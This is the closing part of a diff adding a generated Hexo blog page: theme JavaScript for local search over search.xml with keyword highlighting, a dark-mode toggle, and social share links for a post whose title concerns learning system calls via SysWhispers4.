+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E4%BB%A5SysWhispers4%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8 + '&url=' + http%3A%2F%2Fexample.com%2F2026%2F06%2F20%2F%25E4%25BB%25A5SysWhispers4%25E9%25A1%25B9%25E7%259B%25AE%25E5%25AD%25A6%25E4%25B9%25A0%25E7%25B3%25BB%25E7%25BB%259F%25E8%25B0%2583%25E7%2594%25A8%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2026/06/20/%E4%BB%A5SysWhispers4%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
